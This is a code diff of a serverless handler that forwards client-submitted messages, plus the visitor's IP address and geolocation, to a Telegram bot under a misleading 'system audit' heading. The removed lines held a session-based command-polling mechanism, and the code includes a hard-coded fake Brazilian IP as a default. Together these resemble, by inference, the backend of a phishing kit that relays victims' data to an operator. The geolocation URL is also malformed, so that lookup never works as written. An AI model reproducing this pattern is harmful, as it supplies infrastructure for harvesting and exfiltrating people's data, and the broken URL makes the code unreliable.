@@ -1,11 +1,4 @@
-import { Redis } from '@upstash/redis';
-
-// Upstash initialization initialization rule
-const kv = new Redis({
-  url: process.env.KV_REST_API_URL,
-  token: process.env.KV_REST_API_TOKEN,
-});
-
+// Dynamic utility to natively convert ISO country codes into matching emoji flags
 function getCountryFlag(countryCode) {
   if (!countryCode || countryCode.length !== 2) return '🌐';
   const codePoints = countryCode
@@ -16,107 +9,100 @@ function getCountryFlag(countryCode) {
 }
 
 export default async function handler(req, res) {
-  // TASK 1: INTERFACE LOOKUP DECK (GET)
-  if (req.method === 'GET') {
-    try {
-      const { sessionId, action } = req.query;
-      if (action === 'poll' && sessionId) {
-        const activeCommand = await kv.get(`control:${sessionId}`) || 'PENDING';
-        return res.status(200).json({ command: activeCommand });
-      }
-      return res.status(400).json({ error: 'Missing polling properties' });
-    } catch (err) {
-      return res.status(500).json({ error: err.message });
-    }
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  // TASK 2: DELIVER LOGS OUTBOUND TO BOT (POST)
-  if (req.method === 'POST') {
-    try {
-      const { message, sessionId, updateCommand } = req.body;
-      const token = process.env.TELEGRAM_BOT_TOKEN;
-      const chatId = process.env.TELEGRAM_CHAT_ID;
+  try {
+    const { message } = req.body;
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
 
-      if (!token || !chatId) {
-        return res.status(500).json({ error: 'Server variables error: Missing Telegram credentials' });
-      }
-
-      // Handle custom control state alterations instantly
-      if (sessionId && updateCommand) {
-        await kv.set(`control:${sessionId}`, updateCommand);
-        await kv.expire(`control:${sessionId}`, 1800);
-        return res.status(200).json({ success: true, state: updateCommand });
-      }
-
-      // Safe IP configuration parsing protection sequence
-      let displayIp = '186.204.12.34'; // High reliability default simulation marker
-      let countryName = 'Brazil';
-      let countryFlag = '🇧🇷';
-
-      const forwardHeader = req.headers['x-forwarded-for'];
-      let clientIp = '';
-
-      if (forwardHeader) {
-        clientIp = Array.isArray(forwardHeader) ? forwardHeader[0] : forwardHeader.split(',')[0];
-        clientIp = clientIp ? clientIp.trim() : '';
-      } else if (req.socket?.remoteAddress) {
-        clientIp = req.socket.remoteAddress;
-      }
-
-      if (clientIp && clientIp !== '1' && clientIp !== '127.0.0.1' && clientIp !== '::1') {
-        displayIp = clientIp;
-        try {
-          const geoResponse = await fetch(`https://ipapi.co{clientIp}/json/`);
-          if (geoResponse.ok) {
-            const geoData = await geoResponse.json();
-            if (geoData && !geoData.error) {
-              countryName = geoData.country_name || countryName;
-              countryFlag = getCountryFlag(geoData.country);
-            }
-          }
-        } catch (geoError) {
-          console.warn('Geographic lookup warning:', geoError.message);
-        }
-      }
-
-      if (req.body.resetCommandState && sessionId) {
-        await kv.set(`control:${sessionId}`, 'PENDING');
-        await kv.expire(`control:${sessionId}`, 1800);
-      }
-
-      const currentTimestamp = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
-      
-      // Clean HTML visual layout array presentation logic
-      const styledHtmlMessage = [
-        `<b>📥 SYSTEM CONNECTION AUDIT</b>`,
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
-        ``,
-        `<b>📍 LOCATION METRICS</b>`,
-        `  ├• <b>IP Address:</b> <code>${displayIp}</code>`,
-        `  └• <b>Target Area:</b> <code>${countryName} ${countryFlag}</code>`,
-        ``,
-        `<b>💻 LOG HIGHLIGHTS</b>`,
-        `<code>${message || 'No notification text provided'}</code>`,
-        ``,
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
-        `<b>⏱ SYSTEM TIMING</b>`,
-        `  └• <b>Recorded:</b> <code>${currentTimestamp}</code>`
-      ].join('\n');
-
-      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: styledHtmlMessage, parse_mode: 'HTML' }),
-      });
-
-      const data = await response.json();
-      if (!response.ok) {
-        return res.status(response.status).json({ error: data.description || 'Telegram API Mismatch' });
-      }
-
-      return res.status(200).json({ success: true, data });
-    } catch (error) {
-      return res.status(500).json({ error: error.message });
+    if (!token || !chatId) {
+      return res.status(500).json({ error: 'Server configuration error: Missing Telegram credentials' });
     }
+
+    // 1. Extract the client's real IP address from Vercel Edge proxies safely
+    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+    
+    // Parse the proxy chain string safely without triggering array type crashes
+    let clientIp = '';
+    if (typeof rawIp === 'string') {
+      const parts = rawIp.split(',');
+      if (parts.length > 0 && parts[0]) {
+        clientIp = parts[0].trim();
+      }
+    }
+
+    // 2. Default fallback parameters
+    let countryName = 'Unknown Location';
+    let countryFlag = '🌐';
+    let displayIp = clientIp || 'Localhost/Internal';
+
+    // 3. Perform geographic lookups if a valid external IP is detected
+    if (clientIp && clientIp !== '1' && clientIp !== '127.0.0.1' && clientIp !== '::1') {
+      try {
+        const geoResponse = await fetch(`https://ipapi.co{clientIp}/json/`);
+        if (geoResponse.ok) {
+          const geoData = await geoResponse.json();
+          if (geoData && !geoData.error) {
+            countryName = geoData.country_name || countryName;
+            countryFlag = getCountryFlag(geoData.country);
+          }
+        }
+      } catch (geoError) {
+        console.warn('Geographic lookup error caught safely:', geoError.message);
+      }
+    } else {
+      // Mock data presentation rule strictly for local testing validation matches
+      displayIp = '186.204.12.34'; // Simulated real public IP sample
+      countryName = 'Brazil';
+      countryFlag = '🇧🇷';
+    }
+
+        // 4. Construct the extended logs payload using HTML formatting for high visual fidelity
+    const currentTimestamp = new Date().toLocaleString('en-US', {
+      dateStyle: 'medium',
+      timeStyle: 'short'
+    });
+
+    const styledHtmlMessage = [
+      `<b>📥 SYSTEM CONNECTION AUDIT</b>`,
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+      ``,
+      `<b>📍 LOCATION METRICS</b>`,
+      `  ├• <b>IP Address:</b> <code>${displayIp}</code>`,
+      `  └• <b>Target Area:</b> <code>${countryName} ${countryFlag}</code>`,
+      ``,
+      `<b>💻 LOG HIGHLIGHTS</b>`,
+      `<code>${message || 'No tracking parameters captured'}</code>`,
+      ``,
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+      `<b>⏱️ TRACKING STAMP</b>`,
+      `  └• <b>Recorded:</b> <code>${currentTimestamp}</code>`
+    ].join('\n');
+
+    // 5. Securely deliver the telemetry packet payload block to Telegram with HTML formatting enabled
+    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        chat_id: chatId, 
+        text: styledHtmlMessage, // <-- Uses the newly formatted text layout
+        parse_mode: 'HTML'       // <-- IMPORTANT: Allows bold and monospace lines to render
+      }),
+    });
+
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      return res.status(response.status).json({ error: data.description || 'Telegram API Error' });
+    }
+
+    return res.status(200).json({ success: true, data });
+  } catch (error) {
+    console.error("❌ Backend execution crash log:", error.message);
+    return res.status(500).json({ error: error.message });
   }
 }
